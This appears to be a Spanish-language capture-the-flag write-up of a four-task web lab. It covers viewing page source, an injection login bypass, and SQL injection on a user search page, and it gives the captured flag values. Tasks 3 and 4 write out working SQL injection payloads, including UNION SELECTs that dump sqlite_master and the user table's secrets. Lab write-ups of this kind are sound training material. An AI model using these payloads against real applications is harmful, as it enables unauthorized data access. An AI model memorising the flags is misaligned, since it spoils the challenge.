# Task 1: Identify a vulnerability in the 'About CTF' page

You will find the first flag by analyzing the 'About CTF' page and identifying its root cause. Look for a vulnerable function that may expose critical information.

Ingresamos a "About CTF' y revisamos el codigo fuente (CRTL+U)

<img width="814" height="821" alt="image" src="https://github.com/user-attachments/assets/f58ab58b-56f8-4c21-938a-df4cb39c8c6c" />

FLAG1_61a963241c254152a3483debe869f199

# Task 2: Exploit the login page vulnerability

The application login mechanism contains an injection vulnerability. Use appropriate techniques to bypass authentication and retrieve the second flag.

Probamos una inyección básica:

<img width="352" height="263" alt="image" src="https://github.com/user-attachments/assets/c0536035-472e-4313-83e4-5c3892bb1b8c" />

<img width="472" height="330" alt="image" src="https://github.com/user-attachments/assets/29a437a6-551a-414d-bfda-b5168c0bc957" />

FLAG2_bb6935a1613d4a259febdc1be6ca5363

# Task 3: Exploit the search functionality to discover hidden users

The search users page may be vulnerable to unintended information disclosure. Find a way to enumerate users and locate the third flag.

En la búsqueda de usuarios probamos con:

a' or '1'='1' --

Nos devuelve todos los usuarios

<img width="498" height="340" alt="image" src="https://github.com/user-attachments/assets/028fd20c-bb7d-425f-b69e-e281709e418b" />

# Task 4: Leverage user profile enumeration to extract sensitive data
Newly discovered user accounts may provide access to sensitive details. Analyze the user profile data page and identify potential weaknesses to capture the fourth flag.

con el comando:

a' or '1'='1' union select sql,2 from sqlite_master --

podemos identificar las tablas existentes

<img width="997" height="476" alt="image" src="https://github.com/user-attachments/assets/9c755509-3abd-421a-854a-2e8baffca868" />

por ultimo, extraemos los campos name y secret de la tabla user.

a' UNION SELECT name, secret FROM user --

<img width="656" height="384" alt="image" src="https://github.com/user-attachments/assets/49711e3c-2dd7-4c51-a1c5-210b675b890a" />

FLAG4_c550fc4618794a7aa74f10fa0ffea329
